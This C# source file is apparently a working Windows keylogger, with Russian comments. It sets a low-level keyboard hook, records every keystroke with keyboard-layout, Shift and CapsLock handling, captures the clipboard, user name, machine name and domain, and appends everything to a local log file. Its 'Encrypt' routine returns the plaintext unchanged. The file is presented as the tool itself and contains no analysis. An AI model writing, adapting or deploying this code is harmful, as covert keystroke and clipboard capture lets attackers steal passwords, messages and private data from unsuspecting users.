using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Permissions;


namespace mscorpsystem
{
    static class blackjack_and_whore_class
    {
        public static bool ShiftButton { get; set; }
    }

    class Program
    {
        // инициализируем параметры

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static int myi = 0;

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);

            blackjack_and_whore_class.ShiftButton = false;

            _hookID = SetHook(_proc);
            // получаем переменные окружения и данные о пользователе

            writer.Write_Start(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
            writer.Write_Start(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"));
            writer.Write_Start(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
            writer.Write_Start(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
            writer.Write_Start(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
            writer.Write_Start(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
            writer.Write_Start(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));
            writer.Write_Endline();

            // получаем буфер обмена при запуске
            string htmlData = GetBuff();
            writer.Write_Start(htmlData);
            writer.Write_Endline();
            Console.WriteLine("Clipboard: {0}", htmlData);

            // получаем текущую раскладку клавиатуры

            ushort lang = GetKeyboardLayout();
            mss = lang.ToString();

            Console.WriteLine("Первоначальная раскладка!!: {0}\n", mss);
            writer.Write_Start(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
            Application.Run();


            UnhookWindowsHookEx(_hookID);
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                KeysConverter kc = new KeysConverter();

                string mystring = kc.ConvertToString((Keys)vkCode);
                string original = mystring;
                string encrypted;

                bool capslock = Control.IsKeyLocked(Keys.CapsLock);
                bool shift = blackjack_and_whore_class.ShiftButton;

                // запрашиваем раскладку клавиатуры для каждого символа

                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();

                if (mss != mss_check)
                {
                    Console.WriteLine("Смена раскладки: {0}", mss_check);
                    encrypted = Encrypt("\n<Смена раскладки:" + mss_check + " >\n", "Key");

                    writer.Write_Start(encrypted);
                    mss = mss_check;
                }


                //ПЕРВОЕ ИЗМЕНЕНИЕ - меняем все символы на нужные. Пробел, энтер, точки, запятые слеши, итд
                //ВТОРОЕ ИЗМЕНЕНИЕ - определяем язык. Если русский - переводим. Нет - оставляем.
                //ТРЕТЬЕ ИМЕНЕНИЕ - определяем нажат ли CapsLock
                //ЧЕТВЕРТОЕ ИЗМЕНЕНИЕ - определяем зажат ли Shift

                if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                {
                    if (Keys.LShiftKey == (Keys)vkCode) //определяем, нажата ли клавиша Shift
                    {
                        shift = true;
                    }

                    original = ChangeSymbol.keyboardLayotReverse(original); //сначала реверс символов (space на " ")

                    if (lang_check == 1049) //если раскладка русская
                    {
                        original = ChangeSymbol.keyboardLayotRU(original); //смена символов на русский
                        if (!capslock) //Если капс выключен
                            original = ChangeSymbol.keyboardLayotSmallLeterRU(original); //уменьшение букв
                        if (shift) //если шифт включен
                        {
                            original = ChangeSymbol.keyboardLayotBigLeterRU(original); //увеличение букв
                        }
                    }
                    else
                    {
                        if (!capslock) //Если капс выключен
                            original = ChangeSymbol.keyboardLayotSmallLeterEN(original); //уменьшение букв
                        if (shift) //если шифт включен
                            original = ChangeSymbol.keyboardLayotBigLeterEN(original);
                    }
                    Console.WriteLine("Original:   {0}", original);
                    writer.Write_Symbol(Encrypt(original, "Key"));
                }

                if (wParam == (IntPtr)WM_KEYUP) // пишем только те что были отпущены (в нашем случае все контрольные)
                {
                    if (Keys.LShiftKey == (Keys)vkCode)
                    {
                        shift = false;
                    }
                    if (Keys.LControlKey == (Keys)vkCode)
                    {
                        writer.Write_Start(Encrypt(original, "Key"));
                    } // если был отпущен = запись
                    if (Keys.LShiftKey == (Keys)vkCode)
                    {
                        writer.Write_Start(Encrypt(original, "Key"));
                    } // если был отпущен = запись
                }
                blackjack_and_whore_class.ShiftButton = shift;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }

        // Записываем шифрованный текст в файл

        //public static void Writer(string inputstring)
        //{

        //    StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
        //    if (endline == false)
        //        sw.Write(inputstring);
        //    else
        //    {
        //        sw.WriteLine(inputstring);
        //        sw.WriteLine();
        //    }
        //    sw.Flush();
        //    sw.Close();
        //}

        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(plainText))
                return "";

            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
             (password, saltValueBytes, hashAlgorithm, passwordIterations);

            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;

            byte[] cipherTextBytes = null;

            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
            (keyBytes, initialVectorBytes))
            {
                using (MemoryStream memStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream
                             (memStream, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                        cryptoStream.FlushFinalBlock();
                        cipherTextBytes = memStream.ToArray();
                        memStream.Close();
                        cryptoStream.Close();
                    }
                }
            }

            symmetricKey.Clear();
            //return Convert.ToBase64String(cipherTextBytes);
            return plainText;
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        const int SW_HIDE = 0;

        //------------------------------Пробуем узнать раскладку клавиатуры-------------------------------------------------//

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );


        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
    }

    class writer
    {
        public static void Write_Start(string inputstring)
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            sw.WriteLine(inputstring);
            sw.Flush();
            sw.Close();
        }
        public static void Write_Symbol(string inputstring)
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            sw.Write(inputstring);
            sw.Flush();
            sw.Close();
        }
        public static void Write_Endline()
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            sw.WriteLine();
            sw.Flush();
            sw.Close();
        }
        
    }
}